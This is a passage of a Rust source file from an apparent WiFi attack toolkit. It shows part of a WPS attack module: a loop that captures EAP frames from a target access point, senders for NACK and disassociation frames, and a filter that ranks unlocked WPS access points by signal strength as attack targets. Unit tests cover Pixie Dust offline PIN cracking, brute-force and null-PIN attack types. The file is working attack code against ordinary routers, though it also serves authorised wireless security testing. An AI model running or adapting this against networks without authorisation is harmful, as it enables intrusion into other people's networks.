    use crate::protocol::eapol::{self as eapol_parser, ParsedEapol};
    use std::io::Write;

    let deadline = Instant::now() + timeout;
    let mut frame_count = 0u32;
    let mut data_count = 0u32;
    let mut eapol_count = 0u32;

    // Debug logging to file
    let mut dbg = std::fs::OpenOptions::new()
        .create(true).append(true)
        .open("/tmp/wifikit_wps_eap_debug.txt")
        .ok();
    if let Some(ref mut f) = dbg {
        let _ = writeln!(f, "\n=== wait_for_eap: bssid={} timeout={:?} ===", bssid, timeout);
    }

    while Instant::now() < deadline && running.load(Ordering::SeqCst) {
        let remaining = deadline.saturating_duration_since(Instant::now());
        let poll = remaining.min(Duration::from_millis(200));

        if let Some(frame) = reader.recv_timeout(poll) {
            frame_count += 1;

            // Log ALL frame types we see
            match &frame.body {
                FrameBody::Data { bssid: b, payload, .. } => {
                    data_count += 1;
                    let is_our_bssid = b == bssid;
                    if let Some(ref mut f) = dbg {
                        let _ = writeln!(f, "  [{}] DATA bssid={} ours={} payload={:?} raw_len={}",
                            frame_count, b, is_our_bssid,
                            match payload {
                                DataPayload::Eapol(ParsedEapol::Key { .. }) => "EAPOL-Key",
                                DataPayload::Eapol(ParsedEapol::Eap { .. }) => "EAPOL-Eap",
                                DataPayload::Eapol(ParsedEapol::Start { .. }) => "EAPOL-Start",
                                DataPayload::Eapol(ParsedEapol::Logoff { .. }) => "EAPOL-Logoff",
                                DataPayload::Null => "Null",
                                DataPayload::Encrypted => "Encrypted",
                                DataPayload::Llc { .. } => "Llc",
                                DataPayload::Other => "Other",
                            },
                            frame.raw.len());
                    }
                    // Hex dump frames addressed to us that aren't parsed as EAPOL
                    if is_our_bssid && !matches!(payload, DataPayload::Null) && !matches!(payload, DataPayload::Eapol(_)) {
                        if let Some(ref mut f) = dbg {
                            let raw = &frame.raw;
                            let _ = writeln!(f, "  >>> MYSTERY FRAME from target, {} bytes, is_qos={}, fc={:02x}{:02x}",
                                raw.len(), frame.is_qos,
                                if raw.len() > 0 { raw[0] } else { 0 },
                                if raw.len() > 1 { raw[1] } else { 0 });
                            // Dump first 48 bytes hex
                            let dump_len = raw.len().min(48);
                            let hex: String = raw[..dump_len].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
                            let _ = writeln!(f, "  >>> HEX: {}", hex);
                            // Show bytes at LLC/SNAP offset
                            let llc_off: usize = if frame.is_qos { 26 } else { 24 };
                            if raw.len() > llc_off + 8 {
                                let llc_hex: String = raw[llc_off..llc_off+8].iter().map(|b| format!("{:02x}", b)).collect::<Vec<_>>().join(" ");
                                let _ = writeln!(f, "  >>> LLC@{}: {}", llc_off, llc_hex);
                            }
                        }
                    }

                    // Check for EAP packet from our BSSID
                    if let DataPayload::Eapol(ParsedEapol::Eap { .. }) = payload {
                        eapol_count += 1;
                        if !is_our_bssid { continue; }

                        if let Some(ref mut f) = dbg {
                            let _ = writeln!(f, "  >>> MATCH! EAP from our BSSID");
                        }

                        // Extract raw EAP bytes (after LLC/SNAP + EAPOL header) from raw frame
                        let llc_off: usize = if frame.is_qos { 26 } else { 24 };
                        let eapol_off = llc_off + 8; // skip LLC/SNAP
                        let eap_off = eapol_off + eapol_parser::HEADER_LEN; // skip EAPOL header
                        if eap_off < frame.raw.len() {
                            if let Some(ref mut f) = dbg {
                                let _ = writeln!(f, "  >>> Returning EAP data, {} bytes", frame.raw.len() - eap_off);
                            }
                            return Some(frame.raw[eap_off..].to_vec());
                        }
                    }
                }
                other => {
                    // Log non-data frames briefly
                    if frame_count <= 20 || frame_count % 100 == 0 {
                        if let Some(ref mut f) = dbg {
                            let body_type = format!("{:?}", std::mem::discriminant(other));
                            let _ = writeln!(f, "  [{}] {} raw_len={}", frame_count, body_type, frame.raw.len());
                        }
                    }
                }
            }
        }
    }

    if let Some(ref mut f) = dbg {
        let elapsed = (Instant::now() - (deadline - timeout)).as_millis();
        let reason = if !running.load(Ordering::SeqCst) {
            "STOPPED (running=false)"
        } else {
            "TIMEOUT"
        };
        let _ = writeln!(f, "=== {}: {} frames seen, {} data, {} eapol, {}ms elapsed ===",
            reason, frame_count, data_count, eapol_count, elapsed);
    }
    None
}

/// Extract WPS Config Error from a WSC message body.
fn extract_config_error(wps_body: &[u8]) -> Option<u16> {
    let data = tlv_find(wps_body, attr::CONFIG_ERROR)?;
    if data.len() == 2 {
        Some(u16::from_be_bytes([data[0], data[1]]))
    } else {
        None
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Cleanup helpers
// ═══════════════════════════════════════════════════════════════════════════════

fn send_nack(
    shared: &SharedAdapter,
    session: &WpsSession,
    bssid: &MacAddress,
    tx_opts: &TxOptions,
    info: &Arc<Mutex<WpsInfo>>,
    _events: &Arc<EventRing<WpsEvent>>,
    _start: Instant,
) {
    let nack_body = build_wsc_nack(&session.e_nonce, &session.r_nonce, 0);
    let nack_eap = build_eap_wsc_msg(session.eap_id, opcode::WSC_NACK, &nack_body);
    let nack_frame = build_data_frame(bssid, &session.our_mac, &nack_eap);
    let _ = shared.tx_frame(&nack_frame, tx_opts);
    inc_frames_sent(info);
}

fn send_disassoc(
    shared: &SharedAdapter,
    bssid: MacAddress,
    tx_opts: &TxOptions,
    info: &Arc<Mutex<WpsInfo>>,
    events: &Arc<EventRing<WpsEvent>>,
    start: Instant,
    attack_id: AttackId,
) {
    let disassoc = frames::build_disassoc(
        &bssid,
        &bssid,
        &bssid,
        ReasonCode::DisassocLeaving,
    );
    let _ = shared.tx_frame(&disassoc, tx_opts);
    inc_frames_sent(info);
    push_event(shared, events, start, WpsEventKind::DisassocSent { bssid }, attack_id);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Info/Event helpers
// ═══════════════════════════════════════════════════════════════════════════════

fn push_event(
    shared: &SharedAdapter,
    events: &Arc<EventRing<WpsEvent>>,
    start: Instant,
    kind: WpsEventKind,
    attack_id: AttackId,
) {
    let seq = events.seq() + 1;
    let timestamp = start.elapsed();

    // Emit into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackEvent {
        id: attack_id,
        seq,
        timestamp,
        event: AttackEventKind::Wps(kind.clone()),
    }]);

    // Push to legacy EventRing (still consumed by CLI polling path)
    events.push(WpsEvent { seq, timestamp, kind });
}

fn set_phase(
    shared: &SharedAdapter,
    info: &Arc<Mutex<WpsInfo>>,
    phase: WpsPhase,
    attack_id: AttackId,
) {
    // Emit phase change into the delta stream
    shared.emit_updates(vec![StoreUpdate::AttackPhaseChanged {
        id: attack_id,
        phase: phase.to_attack_phase(),
    }]);

    // Update legacy Info struct (still consumed by CLI polling path)
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.phase = phase;
    i.elapsed = i.start_time.elapsed();
}

fn set_status(info: &Arc<Mutex<WpsInfo>>, status: WpsStatus) {
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.status = status;
}

fn set_detail(info: &Arc<Mutex<WpsInfo>>, detail: &str) {
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.detail = detail.to_string();
    i.wait_timeout = None;
}

/// Set detail with a timeout progress bar.
fn set_detail_wait(info: &Arc<Mutex<WpsInfo>>, detail: &str, timeout: Duration) {
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.detail = detail.to_string();
    i.wait_started = Instant::now();
    i.wait_timeout = Some(timeout);
}

fn emit_counters(
    shared: &SharedAdapter,
    attack_id: AttackId,
    info: &Arc<Mutex<WpsInfo>>,
    start: Instant,
    tx_fb: &crate::core::TxFeedback,
) {
    let mut info = info.lock().unwrap_or_else(|e| e.into_inner());
    let elapsed_secs = start.elapsed().as_secs_f64();
    if elapsed_secs > 0.0 {
        info.frames_per_sec = info.frames_sent as f64 / elapsed_secs;
    }
    shared.emit_updates(vec![StoreUpdate::AttackCountersUpdate {
        id: attack_id,
        frames_sent: info.frames_sent,
        frames_received: info.frames_received,
        frames_per_sec: info.frames_per_sec,
        elapsed: start.elapsed(),
        tx_feedback: tx_fb.snapshot(),
    }]);
}

fn inc_frames_sent(info: &Arc<Mutex<WpsInfo>>) {
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.frames_sent += 1;
}

fn inc_frames_received(info: &Arc<Mutex<WpsInfo>>) {
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.frames_received += 1;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Target filtering — select WPS-enabled APs from scanner results
// ═══════════════════════════════════════════════════════════════════════════════

use crate::store::WpsState;

/// Filter scanner APs to those eligible for WPS attack.
///
/// Selection criteria:
///   - WPS state is Configured or NotConfigured (not None)
///   - AP is not already known to be WPS-locked
///   - RSSI above minimum threshold (if specified)
///
/// Returns sorted by RSSI (strongest first — best chance of success).
pub fn filter_wps_targets(aps: &[Ap], rssi_min: i8) -> Vec<Ap> {
    let mut targets: Vec<Ap> = aps.iter()
        .filter(|ap| {
            matches!(ap.wps_state, WpsState::Configured | WpsState::NotConfigured)
                && !ap.wps_locked
                && ap.rssi >= rssi_min
        })
        .cloned()
        .collect();

    // Sort by RSSI descending (strongest first)
    targets.sort_by(|a, b| b.rssi.cmp(&a.rssi));
    targets
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_wps_attack_type_names() {
        assert_eq!(WpsAttackType::PixieDust.name(), "Pixie Dust");
        assert_eq!(WpsAttackType::BruteForce.short_name(), "brute");
        assert_eq!(WpsAttackType::NullPin.short_name(), "null-pin");
    }

    #[test]
    fn test_wps_params_default() {
        let p = WpsParams::default();
        assert_eq!(p.attack_type, WpsAttackType::PixieDust);
        assert_eq!(p.eap_timeout, Duration::from_millis(5000));
        assert_eq!(p.auth_retries, 3);
        assert_eq!(p.assoc_retries, 3);
        assert!(p.disassoc_after);
        assert!(!p.rotate_mac);
        assert_eq!(p.device_name, "WPS Client");
        assert_eq!(p.manufacturer, "Broadcom");
    }

    #[test]
    fn test_wps_info_default() {
        let info = WpsInfo::default();
        assert_eq!(info.phase, WpsPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.frames_sent, 0);
        assert_eq!(info.status, WpsStatus::InProgress);
    }

    #[test]
    fn test_wps_session_new() {
        let mac = MacAddress::new([0x8C, 0x88, 0x2B, 0x01, 0x02, 0x03]);
        let session = WpsSession::new(mac, vec![0; 192], vec![0; 192]);
        assert_eq!(session.our_mac, mac);
        assert_eq!(session.pin, "12345670");
        assert!(!session.has_keys);
        assert!(!session.has_e_s1);
    }

    #[test]
    fn test_wps_session_reset() {
        let mac = MacAddress::new([0x8C, 0x88, 0x2B, 0x01, 0x02, 0x03]);
        let mut session = WpsSession::new(mac, vec![0; 192], vec![0; 192]);
        session.has_keys = true;
        session.has_e_s1 = true;
        session.e_nonce = [0xFF; 16];

        session.reset_for_new_attempt();

        assert!(!session.has_keys);
        assert!(!session.has_e_s1);
        // r_nonce should be different (randomized) — it's ours now
        assert_ne!(session.r_nonce, [0; 16]);
        // privkey/pubkey should be preserved
        assert_eq!(session.privkey.len(), 192);
    }

    #[test]
    fn test_build_data_frame() {
        let bssid = MacAddress::new([0x7C, 0x10, 0xC9, 0x03, 0x10, 0xE0]);
        let our_mac = MacAddress::new([0x8C, 0x88, 0x2B, 0x01, 0x02, 0x03]);
        let eap = vec![0x01, 0x02, 0x03];

        let frame = build_data_frame(&bssid, &our_mac, &eap);

        // 24 (header) + 8 (LLC) + 4 (EAPOL) + 3 (EAP) = 39
        assert_eq!(frame.len(), 39);
        assert_eq!(frame[0], fc::DATA);
        assert_eq!(frame[1], fc_flags::TO_DS);
        // Addr1 = BSSID
        assert_eq!(&frame[4..10], bssid.as_bytes());
        // Addr2 = our MAC
        assert_eq!(&frame[10..16], our_mac.as_bytes());
        // LLC/SNAP
        assert_eq!(&frame[24..32], &[0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E]);
        // EAPOL header
        assert_eq!(frame[32], 0x01); // Version
        assert_eq!(frame[33], 0x00); // Type
        assert_eq!(u16::from_be_bytes([frame[34], frame[35]]), 3); // Length
        // EAP payload
        assert_eq!(&frame[36..39], &[0x01, 0x02, 0x03]);
    }

    #[test]
    fn test_pixie_crack_with_zero_nonces() {
        // Test the offline cracker with a known PIN and zero E-S1/E-S2.
        // As Registrar: we crack AP's E-Hash using predicted E-S1 values.
        let pin = wps_pin_from_halves(1234, 567);
        assert_eq!(pin.len(), 8, "PIN must be 8 digits");

        let mac = MacAddress::new([0x8C, 0x88, 0x2B, 0x01, 0x02, 0x03]);
        let mut session = WpsSession::new(mac, vec![2; 192], vec![3; 192]);
        // pubkey = PKr (ours), pke = PKe (AP's)
        session.pke = vec![4; 192];
        session.authkey = [0x42; 32];

        let half1 = &pin.as_bytes()[..4];
        let half2 = &pin.as_bytes()[4..8];

        let psk1 = wps_hmac_sha256(&session.authkey, half1).unwrap();
        let psk2 = wps_hmac_sha256(&session.authkey, half2).unwrap();

        // Simulate AP's E-Hash with zero E-S1/E-S2 (weak implementation)
        let zero16 = [0u8; 16];
        // E-Hash1 = HMAC(AuthKey, E-S1 || PSK1[0:16] || PKe || PKr)
        session.e_hash1 = wps_hmac_sha256_multi(
            &session.authkey,
            &[&zero16, &psk1[..16], &session.pke, &session.pubkey],
        ).unwrap();
        session.e_hash2 = wps_hmac_sha256_multi(
            &session.authkey,
            &[&zero16, &psk2[..16], &session.pke, &session.pubkey],
        ).unwrap();

        let result = pixie_crack(&session);
        assert!(result.is_some(), "Pixie crack should find the PIN");
        assert_eq!(result.unwrap(), pin);
    }

    #[test]
    fn test_extract_config_error() {
        let mut builder = WpsTlvBuilder::new();
        builder.put_u16(attr::CONFIG_ERROR, 15); // Setup Locked
        let data = builder.finish();

        assert_eq!(extract_config_error(&data), Some(15));
    }

    #[test]
    fn test_extract_config_error_none() {
        let data = []; // empty
        assert_eq!(extract_config_error(&data), None);
    }

    #[test]
    fn test_all_phases_exist() {
        // Verify all phases can be created and default is Idle
        let phase = WpsPhase::default();
        assert_eq!(phase, WpsPhase::Idle);
        // Just verify they all exist and are distinct
        let phases = vec![
            WpsPhase::KeyGeneration,
            WpsPhase::Authenticating,
            WpsPhase::Associating,
            WpsPhase::EapIdentity,
            WpsPhase::WscStart,
            WpsPhase::M1Received,
            WpsPhase::M2Sent,
            WpsPhase::M3Received,
            WpsPhase::M4Sent,
            WpsPhase::PixieCracking,
            WpsPhase::M5Received,
            WpsPhase::M6Sent,
            WpsPhase::M7Received,
            WpsPhase::BruteForcePhase1,
            WpsPhase::BruteForcePhase2,
            WpsPhase::LockoutWait,
            WpsPhase::Done,
        ];
        assert_eq!(phases.len(), 17);
    }
}
